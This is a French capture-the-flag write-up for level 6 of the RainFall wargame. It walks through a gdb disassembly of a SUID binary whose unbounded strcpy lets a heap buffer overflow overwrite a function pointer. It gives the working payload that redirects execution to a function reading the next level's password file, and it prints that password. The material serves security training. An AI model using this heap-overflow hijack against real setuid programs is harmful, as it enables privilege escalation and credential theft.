# Level 6


```bash
level6@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
```

Le binaire `level6` appartient à `level7` et possède le bit **SUID** (`-rwsr-s---`), ce qui signifie qu'il s'exécute avec les droits de `level7`. L'objectif est d'exploiter ce binaire pour lire le mot de passe du niveau suivant.


On observe le comportement de l'executable :

```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)

level6@RainFall:~$ ./level6 aaaaaaaaaaa
Nope

level6@RainFall:~$ ./level6 $(python2 -c 'print("A" * 100)')
Segmentation fault (core dumped)
```

Sans argument : segfault. Avec un argument court : affiche `"Nope"`. Avec un argument trop long : segfault. La faille est dans une fonction `strcpy` non bornée.

On identifie l'appel a plusieurs fonctions avec gdb :

```bash
(gdb) info functions
0x08048454  n
0x08048468  m
0x0804847c  main
```

On observe trois fonctions clés :
- `m`** : affiche `"Nope"` et se termine.
- `n`** : n'est jamais appelée, mais contient `system("/bin/cat /home/user/level7/.pass")`.
- `main`** : alloue deux zones mémoire avec `malloc`, copie l'argument avec `strcpy`, puis appelle une fonction via un pointeur de fonction.

### Fonction `m` — la "mauvaise" fonction

Le code assembleur de la fonction `m` se presente de cette maniere:

``` bash
(gdb) disas m
0x08048468 <+0>:    push   ebp
0x08048469 <+1>:    mov    ebp,esp
0x0804846b <+3>:    sub    esp,0x18
0x0804846e <+6>:    mov    DWORD PTR [esp],0x80485d1   # "Nope"
0x08048475 <+13>:   call   0x8048360 <puts@plt>
0x0804847a <+18>:   leave
0x0804847b <+19>:   ret
```

Elle affiche simplement la chaîne `"Nope"` via `puts`.

Notre cible est la fonction `n` :

``` bash
(gdb) disas n
0x08048454 <+0>:    push   ebp
0x08048455 <+1>:    mov    ebp,esp
0x08048457 <+3>:    sub    esp,0x18
0x0804845a <+6>:    movl   $0x80485b0,(%esp)       # "/bin/cat /home/user/level7/.pass"
0x08048461 <+13>:   call   0x8048370 <system@plt>  # system(/bin/cat /home/user/level7/.pass")
0x08048466 <+18>:   leave
0x08048467 <+19>:   ret
```

Elle exécute `system("/bin/cat /home/user/level7/.pass")` et donne ainsi accès au mot de passe du niveau suivant. Elle n'est jamais appelée directement par `main`.

Le main devoile la logique du programme :

``` bash
(gdb) disas main
0x0804847c <+0>:    push   ebp
0x0804847d <+1>:    mov    ebp,esp
0x0804847f <+3>:    and    esp,0xfffffff0
0x08048482 <+6>:    sub    esp,0x20

0x08048485 <+9>:    mov    DWORD PTR [esp],0x40        # taille = 64 octets
0x0804848c <+16>:   call   malloc                      # malloc(64) -> 0x804a008  -> dest
0x08048491 <+21>:   mov    DWORD PTR [esp+0x1c],eax    # sauvegarde adresse dest

0x08048495 <+25>:   mov    DWORD PTR [esp],0x4         # taille = 4 octets
0x0804849c <+32>:   call   malloc                      # malloc(4)  -> 0x804a050  -> func_ptr
0x080484a1 <+37>:   mov    DWORD PTR [esp+0x18],eax    # sauvegarde adresse func_ptr

0x080484a5 <+41>:   mov    edx,0x8048468               # adresse de m()
0x080484aa <+46>:   mov    eax,DWORD PTR [esp+0x18]    # eax = adresse de func_ptr
0x080484ae <+50>:   mov    DWORD PTR [eax],edx         # *func_ptr = &m   <- pointeur initialisé sur m()

0x080484b0 <+52>:   mov    eax,DWORD PTR [ebp+0xc]     # argv
0x080484b3 <+55>:   add    eax,0x4
0x080484b6 <+58>:   mov    eax,DWORD PTR [eax]         # argv[1]
0x080484b8 <+60>:   mov    edx,eax
0x080484ba <+62>:   mov    eax,DWORD PTR [esp+0x1c]    # eax = adresse de dest
0x080484be <+66>:   mov    DWORD PTR [esp+0x4],edx     # 2e arg strcpy = argv[1]
0x080484c2 <+70>:   mov    DWORD PTR [esp],eax         # 1er arg strcpy = dest
0x080484c5 <+73>:   call   strcpy                      # strcpy(dest, argv[1])  <- FAILLE

0x080484ca <+78>:   mov    eax,DWORD PTR [esp+0x18]    # eax = adresse de func_ptr
0x080484ce <+82>:   mov    eax,DWORD PTR [eax]         # eax = *func_ptr  (= &m par défaut)
0x080484d0 <+84>:   call   eax                         # appel indirect via le pointeur
0x080484d2 <+86>:   leave
0x080484d3 <+87>:   ret
```

Les deux allocations a `main+16` et `main+32` sont contiguës en mémoire (c'est le comportement normal de `malloc` pour des petites allocations successives sur un heap vide). 
La premiere allocation alloue 64 octets et la deuxieme 4 octets, la premiere est une copie de argv[1] et la deuxieme concerve l'adresse de `m()`.
L'offset entre leurs adresses de début est :

```
0x804a050 - 0x804a008 = 0x48 = 72 octets
```

`strcpy(dest, argv[1])` a `main+73` ne vérifie pas la taille de la source. Si `argv[1]` dépasse 64 octets (la taille allouée pour `dest`), la copie déborde dans la zone suivante de la heap, qui contient précisément le pointeur de fonction appelé juste après (`call eax` a `main+84`).

Il suffit donc d'écrire 72 octets de padding (pour traverser tout le bloc `dest` jusqu'à atteindre le pointeur de fonction), puis l'adresse de `n()` pour remplacer le pointeur de `m()` par celui de `n()`.

L'adresse de `n()` est `0x08048454`, encodée en little-endian : `\x54\x84\x04\x08`.

```bash
level6@RainFall:~$ ./level6 $(python2 -c 'print("A" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
Ce qui se passe étape par étape :

1. `strcpy` copie les 72 `A` dans `dest`, puis les 4 octets `\x54\x84\x04\x08` écrasent le contenu de `func_ptr`.
2. `func_ptr` ne pointe plus vers `m()` (`0x08048468`) mais vers `n()` (`0x08048454`).
3. L'appel `call eax` (main+84) exécute donc `n()` à la place de `m()`.
4. `n()` appelle `system("/bin/cat /home/user/level7/.pass")` et affiche le mot de passe.

